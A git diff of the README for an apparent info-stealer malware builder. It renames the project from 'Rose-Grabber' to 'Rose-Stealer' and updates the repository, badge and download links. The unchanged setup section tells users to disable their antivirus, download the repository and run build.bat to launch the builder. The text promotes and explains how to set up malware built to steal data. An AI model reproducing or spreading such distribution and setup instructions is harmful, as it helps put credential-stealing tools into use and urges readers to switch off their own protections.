@@ -1,6 +1,6 @@
 <h1 id="top" align="center">
   <br>
-  <a href="https://github.com/DamagingRose/Rose-Grabber">
+  <a href="https://github.com/rose-dll/Rose-Stealer">
     <img src="resources/assets/builder.png" alt="R">
   </a>
   <br>
@@ -15,14 +15,14 @@
     </a>
     <br>
     <br>
-    <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Grabber?color=%23f390fc&style=for-the-badge" alt="Top Languages">
-    <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Grabber?color=%23f390fc&logoColor=%23f390fc&style=for-the-badge" alt="Stars">
+    <img src="https://img.shields.io/github/languages/top/rose-dll/Rose-Stealer?color=%23f390fc&style=for-the-badge" alt="Top Languages">
+    <img src="https://img.shields.io/github/stars/rose-dll/Rose-Stealer?color=%23f390fc&logoColor=%23f390fc&style=for-the-badge" alt="Stars">
     <br>
-    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Grabber?color=%23f390fc&style=for-the-badge" alt="Commit Activity">
-    <img src="https://img.shields.io/github/last-commit/DamagingRose/Rose-Grabber?color=%23f390fc&logoColor=%23f390fc&style=for-the-badge" alt="Last Commit">
+    <img src="https://img.shields.io/github/commit-activity/w/rose-dll/Rose-Stealer?color=%23f390fc&style=for-the-badge" alt="Commit Activity">
+    <img src="https://img.shields.io/github/last-commit/rose-dll/Rose-Stealer?color=%23f390fc&logoColor=%23f390fc&style=for-the-badge" alt="Last Commit">
     <br>
-    <img src="https://img.shields.io/github/issues/DamagingRose/Rose-Grabber?color=%23f390fc&style=for-the-badge" alt="Open Issues">
-    <img src="https://img.shields.io/github/issues-closed/DamagingRose/Rose-Grabber?color=%23f390fc&style=for-the-badge" alt="Closed Issues">
+    <img src="https://img.shields.io/github/issues/rose-dll/Rose-Stealer?color=%23f390fc&style=for-the-badge" alt="Open Issues">
+    <img src="https://img.shields.io/github/issues-closed/rose-dll/Rose-Stealer?color=%23f390fc&style=for-the-badge" alt="Closed Issues">
     <br>
 </div>
 
@@ -37,7 +37,7 @@
 
 ### Features
 
-A list of features can be found in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/FEATURES.md).
+A list of features can be found in our [documentation](https://github.com/rose-dll/Rose-Stealer/tree/main/docs/FEATURES.md).
 
 ### Disclaimer
 
@@ -48,9 +48,9 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 ### Setup
 
 **Before proceeding, briefly disable your antivirus to avoid accidental removal of important components. Install Python properly, ensuring it's added to PATH. Preferably, use Python 3.11 and uninstall other versions. Thanks!**
-- Download repository [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
+- Download repository [here](https://github.com/rose-dll/Rose-Stealer/archive/refs/heads/main.zip).
 - Extract the zip file.
-- Launch UI by executing [`build.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/build.bat).
+- Launch UI by executing [`build.bat`](https://github.com/rose-dll/Rose-Stealer/blob/main/build.bat).
 
 ### Problems? Get help!
 **You can contact us here:**
